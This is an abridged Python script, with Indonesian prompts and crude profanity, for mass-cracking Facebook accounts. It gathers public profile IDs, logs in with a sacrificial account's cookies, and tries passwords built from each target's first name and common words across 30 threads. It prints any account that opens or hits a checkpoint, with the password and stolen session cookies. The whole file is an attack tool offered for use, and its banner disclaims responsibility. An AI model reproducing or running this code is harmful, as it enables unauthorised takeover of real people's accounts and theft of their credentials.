...
def banner():
	clear()
	ban='''  HACKING & CRACKING FACEBOOK METAVERS
 GUNAKAN TOOLS INI DENGAN SEBAIK - BAIKNYA SAYA TIDAK AKAN BERTANGGUNG JAWAB ATAS MASALAH APA YANG AKAN TIMBUL DARI TOOLS INI TERIMA KASIH  '''
	oi = nel(tekz(ban,justify='center',style='bold'), style='cyan')
	cetak(nel(oi, title='[bold red] • SELAMAT DATANG DI TOOLS • [bold red]'))
	ban='''
•                                             • 
...
•    _/  _/  _/  _/          _/    _/_/_/     •
•   _/      _/   _/         _/    _/          •
•  _/      _/     _/_/   _/_/_/  _/ V.02 Beta •
•                                             • 
•      𝐌𝐔𝐋𝐓𝐈 𝐂𝐑𝐀𝐂𝐊𝐈𝐍𝐆 𝐈𝐃 𝐏𝐔𝐁𝐋𝐈𝐊 𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊      •
•     GITHUB : HTTPS://GITHUB.COM/Strv-BOT    •'''
	oi = nel(tekz(ban,justify='center',style='bold'), style='cyan')
	cetak(nel(oi, title='[bold red] •  INFORMATION TOOLS • [bold red]'))
...
def login_lagi334():
	try:
		os.system('clear')
		logo()
		jalan("%s Silahkan Cari Akun Tumbal Dulu Yang Kuat Kontol Biar Crack Lu enak, dan Masukan Tumbal Mu Kontol, Ambil Cookies Di Cookiedough Jangan Manja anjing memek"%(B))
...
def tolol(my_name,my_id):
	...
	print(f'\33[1;32mSelamat Datang %s '%(my_name))
	print(f'\33[1;32mYour Idz : '+str(my_id))
	print(f'\33[1;32mYour Ip  : {ip}')
	print(f'\33[1;32mGithub   : {gh}')
	print('')
	print('\33[31m 1. Crack ID Publik ')
	print(' 2. Hasil Crack  ')
	print(' 0. Keluar       ')
	teddy = input('\n </> Pilih : ')
	if teddy in ['1']:
...
def kontoll():
	...
	try:
		print('')
		print(f'[%] Total Idz Target Crack 🔥 {h}'+str(len(id)))
		time.sleep(4)
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
...
def setting():
	...
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]•[white]] input Kata sandi Minimal 6 Huruf\n[[cyan]•[white]] Contoh :[green] kamuanak,kontol,sukacoli[white] '))
		pwku=input(' Input Password Tambahan : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
...
def passwrd():
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			frs = nmf.split(' ')[0]
			pwv = ['sayang','bismillah','anjing','katasandi']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
	...
	woi = input('\033[33mingin Menampilkan Opsi Hasil Crack? (y/t) : ')
	if woi in ['y','Y']:
		cek_opsi()
	else:
		exit()
...
'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no'in taplikasi:
					...
					statusok = f'ID : {idf}\nPass : {pw}\nCOOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='OK CUY'))
					break
				elif 'ya'in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
...
\33[37m ╚═════╝     ╚═╝    ╚═╝  ╚═╝    ╚═╝
 ...
 INSTAGRAM : Teddyyyy_11     
 SCRIP FOR : Hacking & Cracking 
 VERSION   : V.02 Beta.Test  
""")
